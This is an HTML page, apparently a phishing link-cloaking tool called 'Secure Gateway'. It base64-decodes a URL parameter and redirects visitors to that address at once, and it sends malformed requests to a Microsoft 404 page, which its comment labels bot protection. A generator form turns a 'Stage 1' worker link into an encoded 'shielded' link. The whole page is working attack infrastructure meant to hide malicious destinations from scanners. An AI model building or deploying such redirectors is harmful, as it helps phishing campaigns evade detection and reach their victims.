<!DOCTYPE html>
<html>
<head>
    <title>Secure Gateway</title>
    <script>
        // --- THE BOUNCER LOGIC ---
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const payload = urlParams.get('p');
            
            if (payload) {
                try {
                    // 1. Decode the destination
                    const destination = atob(payload);
                    
                    // 2. Immediate Redirect for Humans
                    window.location.replace(destination);
                } catch (e) {
                    // 3. Fallback to Microsoft 404 if payload is corrupt (Bot Protection)
                    window.location.replace("https://learn.microsoft.com/en-us/errors/404");
                }
            }
        };
    </script>
    <style>
        /* Simple styling for the Generator UI (only visible when no ?p= is used) */
        body { font-family: sans-serif; background: #0f172a; color: white; padding: 40px; text-align: center; }
        .box { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background: #3b82f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Gateway Console</h2>
        <p>Enter Stage 1 Link:</p>
        <input type="text" id="target" placeholder="https://your-worker.dev/#key">
        <br>
        <button onclick="generate()">Generate Shielded Link</button>
        <p id="result" style="word-break: break-all; color: #10b981; margin-top: 20px;"></p>
    </div>

    <script>
        function generate() {
            const target = document.getElementById('target').value;
            if(!target) return;
            const encoded = btoa(target);
            const final = window.location.origin + window.location.pathname + "?p=" + encoded;
            document.getElementById('result').innerText = final;
        }
    </script>
</body>
</html>
